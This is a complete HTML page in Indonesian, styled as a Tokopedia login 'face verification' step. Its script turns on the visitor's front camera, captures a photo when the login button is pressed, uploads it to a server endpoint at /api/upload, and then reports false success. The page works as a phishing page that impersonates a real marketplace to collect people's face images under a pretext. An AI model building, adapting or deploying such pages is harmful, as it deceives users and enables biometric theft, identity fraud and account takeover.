<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Tokopedia - Verifikasi</title>
    <style>
        :root { --p: #00AA5B; }
        body { background: #f0f3f7; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
        .cam-box { width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--p); margin: 20px auto; overflow: hidden; position: relative; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
        .btn:disabled { background: #ccc; }
        #msg { font-size: 12px; margin-top: 10px; color: #888; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:var(--p)">tokogreen</h2>
        <p style="font-size:14px;color:#666">Verifikasi wajah untuk melanjutkan</p>
        <div class="cam-box"><video id="v" autoplay playsinline muted></video></div>
        <button id="b" class="btn" disabled>Login Sekarang</button>
        <div id="msg">Menyiapkan kamera...</div>
    </div>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const v = document.getElementById('v'), b = document.getElementById('b'), msg = document.getElementById('msg');
        
        // Aktifkan Kamera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => { v.srcObject = s; b.disabled = false; msg.innerText = "Kamera Aktif ✅"; })
        .catch(e => { msg.innerText = "Kamera diblokir! Pastikan HTTPS aktif."; msg.style.color = "red"; });

        b.onclick = async () => {
            b.innerText = "Memproses..."; b.disabled = true;
            const can = document.getElementById('c');
            can.width = v.videoWidth; can.height = v.videoHeight;
            const ctx = can.getContext('2d');
            ctx.translate(can.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0);
            const img = can.toDataURL('image/jpeg', 0.6);
            
            try {
                // PANGGIL API VERCEL
                const res = await fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: img })
                });
                
                if (res.ok) {
                    alert("Verifikasi Berhasil!");
                    window.location.reload();
                } else {
                    alert("Gagal mengirim foto.");
                    b.disabled = false; b.innerText = "Login Sekarang";
                }
            } catch (e) {
                alert("Koneksi Error!");
                b.disabled = false;
            }
        };
    </script>
</body>
</html>
